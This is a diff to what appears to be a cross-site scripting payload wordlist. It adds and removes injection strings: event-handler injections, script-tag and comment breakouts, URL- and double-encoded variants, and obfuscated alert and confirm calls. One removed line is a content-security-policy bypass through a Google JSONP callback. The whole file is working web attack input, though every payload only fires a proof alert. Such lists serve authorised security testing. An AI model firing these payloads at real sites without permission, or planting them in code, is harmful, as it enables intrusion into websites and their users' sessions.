@@ -3,13 +3,21 @@
 alert(1)
 javascript:alert(1)
 <img src=1 onerror=alert(1)>
+%5c%27%3balert(1)%2f%2f
+<script>{onerror=alert}throw 1</script>
 "><svg onload=alert()>
 "><svg onload=alert()><b attr="
 '-alert()-'
 '-alert()//'
 '}alert(1);{'
 '}%0Aalert(1);%0A{'
+<!--<img src="--><img src=x onerror=javascript:alert(1)//">
+\"><img%20src=x%20onerror=javascript:alert(`1`)>
 </script><svg onload=alert()>
+"onmouseover="alert(1)"
+" onmouseover="alert(1)"
+'onmouseover='alert(1)'
+' onmouseover='alert(1)'
 confirm()
 confirm``
 (confirm``)
@@ -17,7 +25,6 @@ confirm``
 [confirm``]
 (((confirm)))``
 co\u006efirm()
-%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
 <d3"<"/onclick="1>[confirm``]"<">z
 <details open ontoggle=alert()>
 <svg/onload=confirm()>
@@ -29,9 +36,13 @@ co\u006efirm()
 %253Csvg%252Fonload%253Dconfirm%2528%2529%253E
 %253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
 ;alert(1);
+;alert(1)//
 [0x0a]alert(1)//
 */alert(1)//
 ';alert(1)//
+";alert(1)//
 &apos;-alert(1)-&apos;
 ';window['ale'+'rt'](1);//
-<script/src=//accounts.google.com/o/oauth2/revoke?callback=alert(1337)>
+</noscript><script>alert(1)</script>
+" onload="alert(1)"
+' onload='alert(1)'
